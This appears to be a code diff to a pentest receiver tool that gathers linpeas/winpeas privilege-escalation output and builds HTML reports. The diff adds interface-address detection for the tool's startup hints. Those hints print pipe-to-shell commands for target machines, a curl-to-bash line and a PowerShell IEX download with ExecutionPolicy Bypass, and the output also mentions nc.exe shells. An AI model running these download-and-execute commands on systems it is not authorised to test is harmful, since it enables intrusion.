@@ -6,7 +6,10 @@ Receives linpeas/winpeas output and generates interactive HTML reports
 
 import os
 import sys
+import argparse
 import hashlib
+import socket
+import subprocess
 import time
 import requests
 from flask import Flask, request, jsonify, send_from_directory, send_file, render_template_string
@@ -53,6 +56,79 @@ def log(msg):
     """Print with immediate flush"""
     print(msg)
     sys.stdout.flush()
+
+
+def get_interface_ip(iface, timeout=5):
+    """Return the IPv4 address configured on a local interface, or None.
+
+    Uses `ip -4 -o addr show dev <iface>` (no privileges needed, no extra
+    dependency) and falls back to the SIOCGIFADDR ioctl when iproute2 is not
+    available. An interface that exists but has no IPv4 address yields None.
+    """
+    if not iface:
+        return None
+
+    try:
+        result = subprocess.run(
+            ['ip', '-4', '-o', 'addr', 'show', 'dev', iface],
+            capture_output=True, text=True, timeout=timeout
+        )
+        if result.returncode == 0:
+            for line in result.stdout.splitlines():
+                fields = line.split()
+                if 'inet' in fields:
+                    return fields[fields.index('inet') + 1].split('/')[0]
+            return None  # interface exists, no IPv4 address
+    except (OSError, subprocess.SubprocessError):
+        pass  # no iproute2 -> try the ioctl below
+
+    try:
+        import fcntl
+        import struct
+
+        siocgifaddr = 0x8915
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+            packed = struct.pack('256s', iface[:15].encode('utf-8'))
+            raw = fcntl.ioctl(sock.fileno(), siocgifaddr, packed)
+            return socket.inet_ntoa(raw[20:24])
+    except Exception:
+        return None
+
+
+def list_ipv4_interfaces():
+    """Return [(interface, address), ...] for every interface with an IPv4 address.
+
+    Only used to build a helpful error message when -i names a bad interface.
+    """
+    found = []
+    try:
+        result = subprocess.run(
+            ['ip', '-4', '-o', 'addr', 'show'],
+            capture_output=True, text=True, timeout=5
+        )
+        for line in result.stdout.splitlines():
+            fields = line.split()
+            if len(fields) > 3 and 'inet' in fields:
+                found.append((fields[1], fields[fields.index('inet') + 1].split('/')[0]))
+    except (OSError, subprocess.SubprocessError):
+        pass
+    return found
+
+
+def parse_args(argv=None):
+    """Parse command line options."""
+    parser = argparse.ArgumentParser(
+        prog='receiver.py',
+        description='ParsingPeas receiver: collects linpeas/winpeas output and '
+                    'renders interactive HTML reports.',
+        epilog='Without -i the startup hints keep the YOUR_IP placeholder.',
+    )
+    parser.add_argument(
+        '-i', '--interface', metavar='IFACE', default=None,
+        help="advertise the local IPv4 address of this interface (e.g. tun0) "
+             "in the startup hints instead of YOUR_IP"
+    )
+    return parser.parse_args(argv)
 
 
 def download_peass_scripts():
@@ -321,6 +397,8 @@ def health():
 
 
 if __name__ == '__main__':
+    args = parse_args()
+
     print("""
     ╔═══════════════════════════════════════╗
     ║       ParsingPeas Receiver v1.3       ║
@@ -331,14 +409,31 @@ if __name__ == '__main__':
     log(f"[+] Output directory: {OUTPUT_DIR}")
     log(f"[+] Reports directory: {REPORTS_DIR}")
     log(f"[+] Scripts directory: {SCRIPTS_DIR}")
+
+    # Address shown in the startup hints. Left untouched (YOUR_IP) unless the
+    # operator passes -i, in which case it is read from that interface.
+    server_ip = 'YOUR_IP'
+    if args.interface:
+        detected = get_interface_ip(args.interface)
+        if detected is None:
+            log(f"[!] No IPv4 address found on interface '{args.interface}'")
+            available = list_ipv4_interfaces()
+            if available:
+                log('[!] Interfaces with an IPv4 address: ' +
+                    ', '.join(f'{name} ({addr})' for name, addr in available))
+            else:
+                log('[!] Could not list interfaces (is iproute2 installed?)')
+            sys.exit(2)
+        server_ip = detected
+        log(f"[+] Using {server_ip} (interface {args.interface})")
     log("")
     
     # Download PEASS scripts if needed
     download_peass_scripts()
     
     log(f"[+] Starting server...\n")
-    log(f"[+] Linux:       curl -sSL http://YOUR_IP:8005/get-script | bash")
-    log(f"[+] Windows:     powershell -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8005/get-script.ps1')\"")
+    log(f"[+] Linux:       curl -sSL http://{server_ip}:8005/get-script | bash")
+    log(f"[+] Windows:     powershell -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://{server_ip}:8005/get-script.ps1')\"")
     log("")
     log(f"⚠️  Windows Shell Compatibility:")
     log(f"   ✅ BEST: nc.exe CMD shells (full output visibility)")
